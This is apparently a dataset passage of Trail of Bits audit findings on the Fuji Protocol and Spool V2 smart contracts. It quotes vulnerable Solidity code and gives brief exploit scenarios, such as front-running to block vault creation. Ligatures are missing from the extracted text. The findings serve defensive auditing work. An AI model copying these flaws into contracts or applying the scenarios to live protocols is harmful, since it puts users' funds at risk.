indexes are used to compute Bobs scaled amount, causing Bob to gain interest for an additional day for free. Recommendations Short term, ensure that all operations that require up-to-date indexes rst call updateF1155Balances. Write tests for each function that depends on up-to-date indexes with assertions that fail if indexes are outdated. Long term, redesign the way indexes are accessed and updated such that a developer cannot simply forget to call updateF1155Balances. 33 Fuji Protocol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "15. Formula for index calculation is unnecessarily complex ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Indexes are updated within the FujiERC1155 contracts updateState function, shown in gure 15.1. Refer to Appendix F for more detail on the index calculation. function updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit { uint256 total = totalSupply(_assetID); if (newBalance > 0 && total > 0 && newBalance > total) { uint256 diff = newBalance - total; uint256 amountToIndexRatio = (diff.wadToRay()).rayDiv(total.wadToRay()); uint256 result = amountToIndexRatio + WadRayMath.ray(); result = result.rayMul(indexes[_assetID]); require(result <= type(uint128).max, Errors.VL_INDEX_OVERFLOW); indexes[_assetID] = uint128(result); // TODO: calculate interest rate for a fujiOptimizer Fee. } } Figure 15.1: FujiERC1155.sol#L40-57 The code in gure 14.1 translates to the following equation: =    1 * (1 + (    )/ 1 ) 1 Using the distributive property, we can transform this equation into the following: =    1 / * (1 +   1 This version can then be simplied:   / 1 ) 1 =    1 / * (1 +   1  1) 35 Fuji Protocol Finally, we can simplify the equation even further: =    1 / *   1 The resulting equation is simpler and more intuitively conveys the underlying ideathat the index grows by the same ratio as the balance grew since the last index update. Recommendations Short term, use the simpler index calculation formula in the updateState function of the Fuji1155Contract. This will result in code that is more intuitive and that executes using slightly less gas. Long term, use simpler versions of the equations used by the protocol to make the arithmetic easier to understand and implement correctly. 36 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "16. Flashers initiateFlashloan function does not revert on invalid ashnum values ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The Flasher contracts initiateFlashloan function does not initiate a ash loan or perform a renancing operation if the flashnum parameter is set to a value greater than 2. However, the function does not revert on invalid flashnum values. function initiateFlashloan(FlashLoan.Info calldata info, uint8 _flashnum) external isAuthorized { if (_flashnum == 0) { _initiateAaveFlashLoan(info); } else if (_flashnum == 1) { _initiateDyDxFlashLoan(info); } else if (_flashnum == 2) { _initiateCreamFlashLoan(info); } } Figure 16.1: Flasher.sol#L61-69 Exploit Scenario Alice, an executor of the Fuji Protocol, calls Controller. doRefinancing with the flashnum parameter set to 3. As a result, no ash loan is initialized, and no renancing happens; only the active provider is changed. This results in unexpected behavior. For example, if a user wants to repay his debt after renancing, the operation will fail, as no debt is owed to the active provider. Recommendations Short term, revise initiateFlashloan so that it reverts when it is called with an invalid flashnum value. Long term, ensure that all functions revert if they are called with invalid values. 37 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "21. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Fuji Protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Fuji Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 43 Fuji Protocol A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Spool V2 has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Spool V2 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. Risk of SmartVaultFactory DoS due to lack of access controls on grantSmartVaultOwnership ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Anyone can set the owner of the next smart vault to be created, which will result in a DoS of the SmartVaultFactory contract. The grantSmartVaultOwnership function in the SpoolAccessControl contract allows anyone to set the owner of a smart vault. This function reverts if an owner is already set for the provided smart vault. function grantSmartVaultOwnership( address smartVault, address owner) external { if (smartVaultOwner[smartVault] != address (0)) { revert SmartVaultOwnerAlreadySet(smartVault); } smartVaultOwner[smartVault] = owner; } Figure 2.1: The grantSmartVaultOwnership function in SpoolAccessControl.sol The SmartVaultFactory contract implements two functions for deploying new smart vaults: the deploySmartVault function uses the create opcode, and the deploySmartVaultDeterministically function uses the create2 opcode. Both functions create a new smart vault and call the grantSmartVaultOwnership function to make the message sender the owner of the newly created smart vault. Any user can pre-compute the address of the new smart vault for a deploySmartVault transaction by using the address and nonce of the SmartVaultFactory contract; to compute the address of the new smart vault for a deploySmartVaultDeterministically transaction, the user could front-run the transaction to capture the salt provided by the user who submitted it. Exploit Scenario Eve pre-computes the address of the new smart vault that will be created by the deploySmartVault function in the SmartVaultFactory contract. She then calls the grantSmartVaultOwnership function with the pre-computed address and a nonzero address as arguments. Now, every call to the deploySmartContract function reverts, making the SmartVaultFactory contract unusable. Using a similar strategy, Eve blocks the deploySmartVaultDeterministically function by front-running the user transaction to set the owner of the smart vault address computed using the user-provided salt. Recommendations Short term, add the onlyRole(ROLE_SMART_VAULT_INTEGRATOR, msg.sender) modier to the grantSmartVaultOwnership function to restrict access to it. Long term, follow the principle of least privilege by restricting access to the functions that grant specic privileges to actors of the system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "3. Lack of zero-value check on constructors and initializers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Several contracts constructors and initialization functions fail to validate incoming arguments. As a result, important state variables could be set to the zero address, which would result in the loss of assets. constructor ( ISpoolAccessControl accessControl_, IAssetGroupRegistry assetGroupRegistry_, IRiskManager riskManager_, IDepositManager depositManager_, IWithdrawalManager withdrawalManager_, IStrategyRegistry strategyRegistry_, IMasterWallet masterWallet_ , IUsdPriceFeedManager priceFeedManager_, address ghostStrategy ) SpoolAccessControllable(accessControl_) { _assetGroupRegistry = assetGroupRegistry_; _riskManager = riskManager_; _depositManager = depositManager_; _withdrawalManager = withdrawalManager_; _strategyRegistry = strategyRegistry_; _masterWallet = masterWallet_; _priceFeedManager = priceFeedManager_; _ghostStrategy = ghostStrategy; } Figure 3.1: The SmartVaultManager contracts constructor function in spool-v2-core/SmartVaultManager.sol#L111L130 These constructors include that of the SmartVaultManager contract, which sets the _masterWallet address (gure 3.1). SmartVaultManager contract is the entry point of the system and is used by users to deposit their tokens. User deposits are transferred to the _masterWallet address (gure 3.2). function _depositAssets (DepositBag calldata bag) internal returns ( uint256 ) { [...] for ( uint256 i ; i < deposits.length; ++i) { IERC20(tokens[i]).safeTransferFrom( msg.sender , address ( _masterWallet ), deposits[i]); } [...] } Figure 3.2: The _depositAssets function in spool-v2-core/SmartVaultManager.sol#L649L676 If _masterWallet is set to the zero address, the tokens will be transferred to the zero address and will be lost permanently. The constructors and initialization functions of the following contracts also fail to validate incoming arguments:  StrategyRegistry  DepositSwap  SmartVault  SmartVaultFactory  SpoolAccessControllable  DepositManager  RiskManager  SmartVaultManager  WithdrawalManager  RewardManager  RewardPool  Strategy Exploit Scenario Bob deploys the Spool system. During deployment, Bob accidentally sets the _masterWallet parameter of the SmartVaultManager contract to the zero address. Alice, excited about the new protocol, deposits 1 million WETH into it. Her deposited WETH tokens are transferred to the zero address, and Alice loses 1 million WETH. Recommendations Short term, add zero-value checks on all constructor arguments to ensure that the deployer cannot accidentally set incorrect values. Long term, use Slither , which will catch functions that do not have zero-value checks.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Upgradeable contracts set state variables in the constructor ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The state variables set in the constructor of the RewardManager implementation contract are not visible in the proxy contract, making the RewardManager contract unusable. The same issue exists in the RewardPool and Strategy smart contracts. Upgradeable smart contracts using the delegatecall proxy pattern should implement an initializer function to set state variables in the proxy contract storage. The constructor function can be used to set immutable variables in the implementation contract because these variables do not consume storage slots and their values are inlined in the deployed code. The RewardManager contract is deployed as an upgradeable smart contract, but it sets the state variable _assetGroupRegistry in the constructor function. contract RewardManager is IRewardManager, RewardPool, ReentrancyGuard { ... /* ========== STATE VARIABLES ========== */ /// @notice Asset group registry IAssetGroupRegistry private _assetGroupRegistry; ... constructor ( ISpoolAccessControl spoolAccessControl, IAssetGroupRegistry assetGroupRegistry_, bool allowPoolRootUpdates ) RewardPool(spoolAccessControl, allowPoolRootUpdates) { _assetGroupRegistry = assetGroupRegistry_; } Figure 4.1: The constructor function in spool-v2-core/RewardManager.sol The value of the _assetGroupRegistry variable will not be visible in the proxy contract, and the admin will not be able to add reward tokens to smart vaults, making the RewardManager contract unusable. The following smart contracts are also aected by the same issue: 1. The ReentrancyGuard contract, which is non-upgradeable and is extended by RewardManager 2. The RewardPool contract, which sets the state variable allowUpdates in the constructor 3. The Strategy contract, which sets the state variable StrategyName in the constructor Exploit Scenario Bob creates a smart vault and wants to add a reward token to it. He calls the addToken function on the RewardManager contract, but the transaction unexpectedly reverts. Recommendations Short term, make the following changes: 1. Make _assetGroupRegistry an immutable variable in the RewardManager contract. 2. Extend the ReentrancyGuardUpgradeable contract in the RewardManager contract. 3. Make allowUpdates an immutable variable in the RewardPool contract. 4. Move the statement _strategyName = strategyName_; from the Strategy contracts constructor to the contracts __Strategy_init function. 5. Review all of the upgradeable contracts to ensure that they extend only upgradeable library contracts and that the inherited contracts have a __gap storage variable to prevent storage collision issues with future upgrades. Long term, review all of the upgradeable contracts to ensure that they use the initializer function instead of the constructor function to set state variables. Use slither-check-upgradeability to nd issues related to upgradeable smart contracts. 5. Insu\u0000cient validation of oracle price data Severity: Low Diculty: Medium Type: Data Validation Finding ID: TOB-SPL-5 Target: managers/UsdPriceFeedManager.sol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "6. Incorrect handling of fromVaultsOnly in removeStrategy ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The removeStrategy function allows Spool admins to remove a strategy from the smart vaults using it. Admins are also able to remove the strategy from the StrategyRegistry contract, but only if the value of fromVaultsOnly is false ; however, the implementation enforces the opposite, as shown in gure 6.1. function removeStrategy( address strategy, bool fromVaultsOnly) external { _checkRole(ROLE_SPOOL_ADMIN, msg.sender ); _checkRole(ROLE_STRATEGY, strategy); ... if ( fromVaultsOnly ) { _strategyRegistry.removeStrategy(strategy); } } Figure 6.1: The removeStrategy function in spool-v2-core/SmartVaultManager.sol#L298L317 Exploit Scenario Bob, a Spool admin, calls removeStrategy with fromVaultsOnly set to true , believing that this call will not remove the strategy from the StrategyRegistry contract. However, once the transaction is executed, he discovers that the strategy was indeed removed. Recommendations Short term, replace if (fromVaultsOnly) with if (!fromVaultsOnly) in the removeStrategy function to implement the expected behavior. Long term, improve the systems unit and integration tests to catch issues such as this one.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "7. Risk of LinearAllocationProvider and ExponentialAllocationProvider reverts due to division by zero ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The LinearAllocationProvider and ExponentialAllocationProvider contracts calculateAllocation function can revert due to a division-by-zero error: LinearAllocationProvider s function reverts when the sum of the strategies APY values is 0 , and ExponentialAllocationProvider s function reverts when a single strategy has an APY value of 0 . Figure 7.1 shows a snippet of the LinearAllocationProvider contracts calculateAllocation function; if the apySum variable, which is the sum of all the strategies APY values, is 0 , a division-by-zero error will occur. uint8 [] memory arrayRiskScores = data.riskScores; for ( uint8 i; i < data.apys.length; ++i) { apySum += (data.apys[i] > 0 ? uint256 (data.apys[i]) : 0); riskSum += arrayRiskScores[i]; } uint8 riskt = uint8 (data.riskTolerance + 10); // from 0 to 20 for ( uint8 i; i < data.apys.length; ++i) { uint256 apy = data.apys[i] > 0 ? uint256 (data.apys[i]) : 0; apy = (apy * FULL_PERCENT) / apySum ; Figure 7.1: Part of the calculateAllocation function in spool-v2-core/LinearAllocationProvider.sol#L39L49 Figure 7.2 shows that for the ExponentialAllocationProvider contracts calculateAllocation function, if the call to log_2 occurs with partApy set to 0 , the function will revert because of log_2 s require statement shown in gure 7.3. for ( uint8 i; i < data.apys.length; ++i) { uint256 uintApy = (data.apys[i] > 0 ? uint256 (data.apys[i]) : 0); int256 partRiskTolerance = fromUint( uint256 (riskArray[ uint8 (20 - riskt)])); partRiskTolerance = div(partRiskTolerance, _100); int256 partApy = fromUint(uintApy); partApy = div(partApy, _100); int256 apy = exp_2(mul(partRiskTolerance, log_2(partApy) )); Figure 7.2: Part of the calculateAllocation function in spool-v2-core/ExponentialAllocationProvider.sol#L323L331 function log_2( int256 x) internal pure returns ( int256 ) { unchecked { require (x > 0); Figure 7.3: Part of the log_2 function in spool-v2-core/ExponentialAllocationProvider.sol#L32L34 Exploit Scenario Bob deploys a smart vault with two strategies using the ExponentialAllocationProvider contract. At some point, one of the strategies has 0 APY, causing the transaction call to reallocate the assets to unexpectedly revert. Recommendations Short term, modify both versions of the calculateAllocation function so that they correctly handle cases in which a strategys APY is 0 . Long term, improve the systems unit and integration tests to ensure that the basic operations work as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "8. Strategy APYs are never updated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The _updateDhwYieldAndApy function is never called. As a result, each strategys APY will constantly be set to 0 . function _updateDhwYieldAndApy( address strategy, uint256 dhwIndex, int256 yieldPercentage) internal { if (dhwIndex > 1) { unchecked { _stateAtDhw[address(strategy)][dhwIndex - 1].timestamp); int256 timeDelta = int256 (block.timestamp - if (timeDelta > 0) { timeDelta; int256 normalizedApy = yieldPercentage * SECONDS_IN_YEAR_INT / int256 weight = _getRunningAverageApyWeight(timeDelta); _apys[strategy] = (_apys[strategy] * (FULL_PERCENT_INT - weight) + normalizedApy * weight) / FULL_PERCENT_INT; } } } } Figure 8.1: The _updateDhwYieldAndApy function in spool-v2-core/StrategyManager.sol#L298L317 A strategys APY is one of the parameters used by an allocator provider to decide where to allocate the assets of a smart vault. If a strategys APY is 0 , the LinearAllocationProvider and ExponentialAllocationProvider contracts will both revert when calculateAllocation is called due to a division-by-zero error. // set allocation if (uint16a16.unwrap(allocations) == 0) { _riskManager.setRiskProvider(smartVaultAddress, specification.riskProvider); _riskManager.setRiskTolerance(smartVaultAddress, specification.riskTolerance); _riskManager.setAllocationProvider(smartVaultAddress, specification.allocationProvider); allocations = _riskManager.calculateAllocation(smartVaultAddress, specification.strategies); } Figure 8.2: Part of the _integrateSmartVault function, which is called when a vault is created, in spool-v2-core/SmartVaultFactory.sol#L313L3 20 When a vault is created, the code in gure 8.2 is executed. For vaults whose strategyAllocation variable is set to 0 , which means the value will be calculated by the smart contract, and whose allocationProvide r variable is set to the LinearAllocationProvider or ExponentialAllocationProvider contract, the creation transaction will revert due to a division-by-zero error. Transactions for creating vaults with a nonzero strategyAllocation and with the same allocationProvider values mentioned above will succeed; however, the fund reallocation operation will revert because the _updateDhwYieldAndApy function is never called, causing the strategies APYs to be set to 0 , in turn causing the same division-by-zero error. Refer to nding TOB-SPL-7 , which is related to this issue; even if that nding is xed, incorrect results would still occur because of the missing _updateDhwYieldAndApy calls. Exploit Scenario Bob tries to deploy a smart vault with strategyAllocation set to 0 and allocationProvide r set to LinearAllocationProvider . The transaction unexpectedly fails. Recommendations Short term, add calls to _updateDhwYieldAndApy where appropriate. Long term, improve the systems unit and integration tests to ensure that the basic operations work as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "9. Incorrect bookkeeping of assets deposited into smart vaults ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "Assets deposited by users into smart vaults are incorrectly tracked. As a result, assets deposited into a smart vaults strategies when the flushSmartVault function is invoked correspond to the last deposit instead of the sum of all deposits into the strategies. When depositing assets into a smart vault, users can decide whether to invoke the flushSmartVault function. A smart vault ush is a synchronization process that makes deposited funds available to be deployed into the strategies and makes withdrawn funds available to be withdrawn from the strategies. However, the internal bookkeeping of deposits keeps track of only the last deposit of the current ush cycle instead of the sum of all deposits (gure 9.1). function depositAssets(DepositBag calldata bag, DepositExtras calldata bag2) external onlyRole(ROLE_SMART_VAULT_MANAGER, msg.sender ) returns ( uint256 [] memory , uint256 ) { ... // transfer tokens from user to master wallet for ( uint256 i; i < bag2.tokens.length; ++i) { _vaultDeposits[bag.smartVault][bag2.flushIndex][i] = bag.assets[i]; } ... Figure 9.1: A snippet of the depositAssets function in spool-v2-core/DepositManager.sol#L379L439 The _vaultDeposits variable is then used to calculate the asset distribution in the flushSmartVault function. function flushSmartVault( address smartVault, uint256 flushIndex, address [] calldata strategies, uint16a16 allocation, address [] calldata tokens ) external returns (uint16a16) { _checkRole(ROLE_SMART_VAULT_MANAGER, msg.sender ); if (_vaultDeposits[smartVault][flushIndex][0] == 0) { return uint16a16.wrap(0); } // handle deposits uint256 [] memory exchangeRates = SpoolUtils.getExchangeRates(tokens, _priceFeedManager); _flushExchangeRates[smartVault][flushIndex].setValues(exchangeRates); uint256 [][] memory distribution = distributeDeposit ( DepositQueryBag1({ deposit: _vaultDeposits[smartVault][flushIndex].toArray(tokens.length) , exchangeRates: exchangeRates, allocation: allocation, strategyRatios: SpoolUtils.getStrategyRatiosAtLastDhw(strategies, _strategyRegistry) }) ); ... return _strategyRegistry.addDeposits(strategies, distribution) ; } Figure 9.2: A snippet of the flushSmartVault function in spool-v2-core/DepositManager.sol#L188L 226 Lastly, the _strategyRegistry.addDeposits function is called with the computed distribution, which adds the amounts to deploy in the next doHardWork function call in the _assetsDeposited variable (gure 9.3). function addDeposits( address [] calldata strategies_, uint256 [][] calldata amounts) { external onlyRole(ROLE_SMART_VAULT_MANAGER, msg.sender ) returns (uint16a16) uint16a16 indexes; for ( uint256 i; i < strategies_.length; ++i) { address strategy = strategies_[i]; uint256 latestIndex = _currentIndexes[strategy]; indexes = indexes.set(i, latestIndex); for ( uint256 j = 0; j < amounts[i].length; j++) { _assetsDeposited[strategy][latestIndex][j] += amounts[i][j]; } } return indexes; } Figure 9.3: The addDeposits function in spool-v2-core/StrategyRegistry.sol#L343L361 The next time the doHardWork function is called, it will transfer the equivalent of the last deposits amount instead of the sum of all deposits from the master wallet to the assigned strategy (gure 9.4). function doHardWork(DoHardWorkParameterBag calldata dhwParams) external whenNotPaused { ... // Transfer deposited assets to the strategy. for ( uint256 k; k < assetGroup.length; ++k) { if (_assetsDeposited[strategy][dhwIndex][k] > 0) { _masterWallet.transfer( IERC20(assetGroup[k]), strategy, _assetsDeposited[strategy][dhwIndex][k] ); } } ... Figure 9.4: A snippet of the doHardWork function in spool-v2-core/StrategyRegistry.sol#L222L3 41 Exploit Scenario Bob deploys a smart vault. One hundred deposits are made before a smart vault ush is invoked, but only the last deposits assets are deployed to the underlying strategies, severely impacting the smart vaults performance. Recommendations Short term, modify the depositAssets function so that it correctly tracks all deposits within a ush cycle, rather than just the last deposit. Long term, improve the systems unit and integration tests: test a smart vault with a single strategy and multiple strategies to ensure that smart vaults behave correctly when funds are deposited and deployed to the underlying strategies.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "10. Risk of malformed calldata of calls to guard contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The GuardManager contract does not pad custom values while constructing the calldata for calls to guard contracts. The calldata could be malformed, causing the aected guard contract to give incorrect results or to always revert calls. Guards for vaults are customizable checks that are executed on every user action. The result of a guard contract either approves or disapproves user actions. The GuardManager contract handles the logic to call guard contracts and to check their results (gure 10.1). function runGuards( address smartVaultId , RequestContext calldata context) external view { [...] bytes memory encoded = _encodeFunctionCall(smartVaultId, guard , context); ( bool success , bytes memory data) = guard.contractAddress.staticcall(encoded) ; _checkResult (success, data, guard.operator, guard.expectedValue, i); } } Figure 10.1: The runGuards function in spool-v2-core/GuardManager.sol#L19L33 The arguments of the runGuards function include information related to the given user action and custom values dened at the time of guard denition. The GuardManager.setGuards function initializes the guards in the GuardManager contract. Using the guard denition, the GuardManager contract manually constructs the calldata with the selected values from the user action information and the custom values (gure 10.2). function _encodeFunctionCall ( address smartVaultId , GuardDefinition memory guard, RequestContext memory context) internal pure returns ( bytes memory ) { [...] result = bytes .concat(result, methodID ); for ( uint256 i ; i < paramsLength; ++i) { GuardParamType paramType = guard.methodParamTypes[i]; if (paramType == GuardParamType.DynamicCustomValue) { result = bytes .concat(result, abi.encode(paramsEndLoc)); paramsEndLoc += 32 + guard.methodParamValues[customValueIdx].length ; customValueIdx++; } else if (paramType == GuardParamType.CustomValue) { result = bytes .concat(result, guard.methodParamValues[customValueIdx]); customValueIdx++; } [...] } customValueIdx = 0 ; for ( uint256 i ; i < paramsLength; ++i) { GuardParamType paramType = guard.methodParamTypes[i]; if (paramType == GuardParamType.DynamicCustomValue) { result = bytes .concat(result, abi.encode(guard.methodParamValues[customValueIdx].length / 32 )); result = bytes .concat(result, guard.methodParamValues[customValueIdx]); customValueIdx++; } else if (paramType == GuardParamType.CustomValue) { customValueIdx++; } [...] } return result; } Figure 10.2: The _encodeFunctionCall function in spool-v2-core/GuardManager.sol#L111L177 However, the contract concatenates the custom values without considering their lengths and required padding. If these custom values are not properly padded at the time of guard initialization, the call will receive malformed data. As a result, either of the following could happen: 1. Every call to the guard contract will always fail, and user action transactions will always revert. The smart vault using the guard will become unusable. 2. The guard contract will receive incorrect arguments and return incorrect results. Invalid user actions could be approved, and valid user actions could be rejected. Exploit Scenario Bob deploys a smart vault and creates a guard for it. The guard contract takes only one custom value as an argument. Bob created the guard denition in GuardManager without padding the custom value. Alice tries to deposit into the smart vault, and the guard contract is called for her action. The call to the guard contract fails, and the transaction reverts. The smart vault is unusable. Recommendations Short term, modify the associated code so that it veries that custom values are properly padded before guard denitions are initialized in GuardManager.setGuards . Long term, avoid implementing low-level manipulations. If such implementations are unavoidable, carefully review the Solidity documentation before implementing them to ensure that they are implemented correctly. Additionally, improve the user documentation with necessary technical details to properly use the system.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. GuardManager does not account for all possible types when encoding guard arguments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "While encoding arguments for guard contracts, the GuardManager contract assumes that all static types are encoded to 32 bytes. This assumption does not hold for xed-size static arrays and structs with only static type members. As a result, guard contracts could receive incorrect arguments, leading to unintended behavior. The GuardManager._encodeFunctionCall function manually encodes arguments to call guard contracts (gure 11.1). function _encodeFunctionCall ( address smartVaultId , GuardDefinition memory guard, RequestContext memory context) internal pure returns ( bytes memory ) { bytes4 methodID = bytes4 ( keccak256 (abi.encodePacked(guard.methodSignature))); uint256 paramsLength = guard.methodParamTypes.length ; bytes memory result = new bytes ( 0 ); result = bytes .concat(result, methodID); uint16 customValueIdx = 0 ; uint256 paramsEndLoc = paramsLength * 32 ; // Loop through parameters and // - store values for simple types // - store param value location for dynamic types for ( uint256 i ; i < paramsLength; ++i) { GuardParamType paramType = guard.methodParamTypes[i]; if (paramType == GuardParamType.DynamicCustomValue) { result = bytes .concat(result, abi.encode( paramsEndLoc )); paramsEndLoc += 32 + guard.methodParamValues[customValueIdx].length; customValueIdx++; } else if (paramType == GuardParamType.CustomValue) { result = bytes .concat(result, guard.methodParamValues[customValueIdx]); customValueIdx++; } [...] } else if (paramType == GuardParamType.Assets) { result = bytes .concat(result, abi.encode( paramsEndLoc )); paramsEndLoc += 32 + context.assets.length * 32 ; } else if (paramType == GuardParamType.Tokens) { result = bytes .concat(result, abi.encode( paramsEndLoc )); paramsEndLoc += 32 + context.tokens.length * 32 ; } else { revert InvalidGuardParamType( uint256 (paramType)); } } [...] return result; } Figure 11.1: The _encodeFunctionCall function in spool-v2-core/GuardManager.sol#L111L177 The function calculates the oset for dynamic type arguments assuming that every parameter, static or dynamic, takes exactly 32 bytes. However, xed-length static type arrays and structs with only static type members are considered static. All static type values are encoded in-place, and static arrays and static structs could take more than 32 bytes. As a result, the calculated oset for the start of dynamic type arguments could be wrong, which would cause incorrect values for these arguments to be set, resulting in unintended behavior. For example, the guard could approve invalid user actions and reject valid user actions or revert every call. Exploit Scenario Bob deploys a smart vault and creates a guard contract that takes the custom value of a xed-length static array type. The guard contract uses RequestContext assets. Bob correctly creates the guard denition in GuardManager , but the GuardManager._encodeFunctionCall function incorrectly encodes the arguments. The guard contract fails to decode the arguments and always reverts the execution. Recommendations Short term, modify the GuardManager._encodeFunctionCall function so that it considers the encoding length of the individual parameters and calculates the osets correctly. Long term, avoid implementing low-level manipulations. If such implementations are unavoidable, carefully review the Solidity documentation before implementing them to ensure that they are implemented correctly.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "12. Use of encoded values in guard contract comparisons could lead to opposite results ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf", "body": "The GuardManager contract compares the return value of a guard contract to an expected value. However, the contract uses encoded versions of these values in the comparison, which could lead to incorrect results for signed values with numerical comparison operators. The GuardManager contract calls the guard contract and validates the return value using the GuardManager._checkResult function (gure 12.1). function _checkResult ( bool success , bytes memory returnValue, bytes2 operator, bytes32 value , uint256 guardNum ) internal pure { if (!success) revert GuardError(); bool result = true ; if (operator == bytes2( \"==\" )) { result = abi.decode(returnValue, ( bytes32 )) == value; } else if (operator == bytes2( \"<=\" )) { result = abi.decode(returnValue, ( bytes32 )) <= value; } else if (operator == bytes2( \">=\" )) { result = abi.decode(returnValue, ( bytes32 )) >= value; } else if (operator == bytes2( \"<\" )) { result = abi.decode(returnValue, ( bytes32 )) < value; } else if (operator == bytes2( \">\" )) { result = abi.decode(returnValue, ( bytes32 )) > value; } else { result = abi.decode(returnValue, ( bool )); } if (!result) revert GuardFailed(guardNum); } Figure 12.1: The _checkResult function in spool-v2-core/GuardManager.sol#L80L105 When a smart vault creator denes a guard using the GuardManager.setGuards function, they dene a comparison operator and the expected value, which the GuardManager contract uses to compare with the return value of the guard contract. The comparison is performed on the rst 32 bytes of the ABI-encoded return value and the expected value, which will cause issues depending on the return value type. First, the numerical comparison operators ( < , > , <= , >= ) are not well dened for bytes32 ; therefore, the contract treats encoded values with padding as uint256 values before comparing them. This way of comparing values gives incorrect results for negative values of the int<M> type. The Solidity documentation includes the following description about the encoding of int<M> type values: int<M>: enc(X) is the big-endian twos complement encoding of X, padded on the higher-order (left) side with 0x bytes for negative X and with zero-bytes for non-negative X such that the length is 32 bytes. Figure 12.2: A description about the encoding of int<M> type values in the Solidity documentation Because negative values are padded with 0xff and positive values with 0x00 , the encoded negative values will be considered greater than the encoded positive values. As a result, the result of the comparison will be the opposite of the expected result. Second, only the rst 32 bytes of the return value are considered for comparison. This will lead to inaccurate results for return types that use more than 32 bytes to encode the value. Exploit Scenario Bob deploys a smart vault and intends to allow only users who own B NFTs to use it. B NFTs are implemented using ERC-1155. Bob uses the B contract as a guard with the comparison operator > and an expected value of 0 . Bob calls the function B.balanceOfBatch to fetch the NFT balance of the user. B.balanceOfBatch returns uint256[] . The rst 32 bytes of the return data contain the oset into the return data, which is always nonzero. The comparison passes for every user regardless of whether they own a B NFT. As a result, every user can use Bobs smart vault. Recommendations Short term, restrict the return value of a guard contract to a Boolean value. If that is not possible, document the limitations and risks surrounding the guard contracts. Additionally, consider manually checking new action guards with respect to these limitations. Long term, avoid implementing low-level manipulations. If such implementations are unavoidable, carefully review the Solidity documentation before implementing them to ensure that they are implemented correctly.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "13. Lack of contract existence checks 